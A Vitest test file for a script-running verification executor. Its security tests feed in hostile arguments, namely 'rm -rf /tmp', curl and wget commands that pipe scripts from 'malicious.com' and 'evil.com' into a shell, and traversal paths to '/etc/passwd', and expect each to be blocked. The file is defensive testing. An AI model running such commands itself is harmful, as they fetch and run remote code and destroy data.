/**
 * Tests for ScriptStrategyExecutor
 * Universal Verification Strategy (UVS) Phase 3
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import type { Feature } from "../../src/types.js";
import type { ScriptVerificationStrategy } from "../../src/verifier/types/index.js";

// Use vi.hoisted to define mocks that will be available when vi.mock factories run
const { mockExecAsync, mockAccess } = vi.hoisted(() => ({
  mockExecAsync: vi.fn(),
  mockAccess: vi.fn(),
}));

// Mock modules
vi.mock("node:child_process", () => ({
  exec: vi.fn(),
}));

vi.mock("node:util", () => ({
  promisify: vi.fn(() => mockExecAsync),
}));

vi.mock("node:fs/promises", () => ({
  access: mockAccess,
  constants: { R_OK: 4, X_OK: 1 },
}));

// Import after mocks are defined
import { ScriptStrategyExecutor, scriptStrategyExecutor } from "../../src/strategies/script-strategy.js";
import { defaultRegistry } from "../../src/strategy-executor.js";

// Base feature for testing
const baseFeature: Feature = {
  id: "test.feature",
  description: "Test feature",
  module: "test",
  priority: 1,
  status: "failing",
  acceptance: ["Acceptance criterion"],
  dependsOn: [],
  supersedes: [],
  tags: [],
  version: 1,
  origin: "manual",
  notes: "",
};

describe("ScriptStrategyExecutor", () => {
  let executor: ScriptStrategyExecutor;

  beforeEach(() => {
    executor = new ScriptStrategyExecutor();
    vi.clearAllMocks();

    // Default mock: script file exists and is readable
    mockAccess.mockResolvedValue(undefined);
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe("type property", () => {
    it("should have type 'script'", () => {
      expect(executor.type).toBe("script");
    });
  });

  describe("execute", () => {
    it("should execute script successfully", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "Script executed successfully",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/verify.sh",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.output).toContain("Script executed successfully");
      expect(result.duration).toBeGreaterThanOrEqual(0);
    });

    it("should fail when script path escapes project root", async () => {
      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "../../../etc/passwd",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.output).toContain("within project root");
      expect(result.details?.reason).toBe("security-violation");
    });

    it("should fail when script file not found", async () => {
      mockAccess.mockRejectedValue(new Error("ENOENT"));

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/nonexistent.sh",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.output).toContain("not found");
    });

    it("should handle script execution failure", async () => {
      const error = new Error("Script failed") as any;
      error.code = 1;
      error.stdout = "Error output";
      error.stderr = "";
      mockExecAsync.mockRejectedValue(error);

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/failing.sh",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.exitCode).toBe(1);
    });

    it("should support custom expected exit code", async () => {
      const error = new Error("Script exited with 2") as any;
      error.code = 2;
      error.stdout = "Expected output";
      error.stderr = "";
      mockExecAsync.mockRejectedValue(error);

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/custom-exit.sh",
        expectedExitCode: 2,
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.details?.exitCode).toBe(2);
      expect(result.details?.expectedExitCode).toBe(2);
    });

    it("should support outputPattern matching", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "BUILD SUCCESS\nAll tests passed",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/build.sh",
        outputPattern: "BUILD SUCCESS",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(true);
      expect(result.details?.patternMatch).toBe(true);
    });

    it("should fail when outputPattern does not match", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "BUILD FAILED\nSome tests failed",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/build.sh",
        outputPattern: "BUILD SUCCESS",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.patternMatch).toBe(false);
    });

    it("should pass arguments to script", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/test.sh",
        args: ["--verbose", "--env", "production"],
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[0]).toContain("--verbose");
      expect(calledArgs[0]).toContain("--env");
      expect(calledArgs[0]).toContain("production");
    });

    it("should use custom environment variables", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/test.sh",
        env: { CUSTOM_VAR: "custom_value", NODE_ENV: "test" },
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[1]?.env?.CUSTOM_VAR).toBe("custom_value");
      expect(calledArgs[1]?.env?.NODE_ENV).toBe("test");
      expect(calledArgs[1]?.env?.CI).toBe("true");
    });

    it("should use custom timeout from strategy", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/slow.sh",
        timeout: 300000,
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[1]?.timeout).toBe(300000);
    });

    it("should use default timeout of 60000ms", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/test.sh",
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[1]?.timeout).toBe(60000);
    });

    it("should handle timeout error", async () => {
      const error = new Error("Timeout") as any;
      error.killed = true;
      error.signal = "SIGTERM";
      error.stdout = "";
      error.stderr = "";
      mockExecAsync.mockRejectedValue(error);

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/slow.sh",
        timeout: 5000,
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.output).toContain("timed out");
      expect(result.details?.reason).toBe("timeout");
    });

    it("should use custom working directory", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/test.sh",
        cwd: "subdir",
      };

      await executor.execute("/project", strategy, baseFeature);

      expect(mockExecAsync).toHaveBeenCalled();
      const calledArgs = mockExecAsync.mock.calls[0];
      expect(calledArgs[1]?.cwd).toContain("subdir");
    });
  });

  describe("security validation", () => {
    it("should block dangerous args containing rm -rf", async () => {
      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/test.sh",
        args: ["rm", "-rf", "/tmp"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
      expect(result.output).toContain("dangerous pattern");
    });

    it("should block args with curl pipe to bash", async () => {
      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/test.sh",
        args: ["curl", "http://malicious.com/script.sh", "|", "bash"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
    });

    it("should block args with wget pipe to shell", async () => {
      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/test.sh",
        args: ["wget", "-O-", "http://evil.com/x", "|", "sh"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
    });

    it("should block paths outside project root", async () => {
      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "/etc/passwd",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.details?.reason).toBe("security-violation");
    });

    it("should block paths with .. traversal", async () => {
      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/../../sensitive.sh",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.success).toBe(false);
      expect(result.output).toContain("within project root");
    });
  });

  describe("return value details", () => {
    it("should include command in details", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/test.sh",
        args: ["arg1"],
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.details?.command).toBeDefined();
      expect(result.details?.command).toContain("scripts/test.sh");
    });

    it("should include path in details", async () => {
      mockExecAsync.mockResolvedValue({
        stdout: "OK",
        stderr: "",
      });

      const strategy: ScriptVerificationStrategy = {
        type: "script",
        required: true,
        path: "scripts/verify.sh",
      };

      const result = await executor.execute("/project", strategy, baseFeature);

      expect(result.details?.path).toBe("scripts/verify.sh");
    });
  });
});

describe("scriptStrategyExecutor singleton", () => {
  it("should be a ScriptStrategyExecutor instance", () => {
    expect(scriptStrategyExecutor).toBeInstanceOf(ScriptStrategyExecutor);
  });

  it("should have type 'script'", () => {
    expect(scriptStrategyExecutor.type).toBe("script");
  });
});

describe("defaultRegistry integration", () => {
  it("should have script executor registered", () => {
    expect(defaultRegistry.has("script")).toBe(true);
  });

  it("should return scriptStrategyExecutor for 'script' type", () => {
    const executor = defaultRegistry.get("script");
    expect(executor).toBe(scriptStrategyExecutor);
  });
});
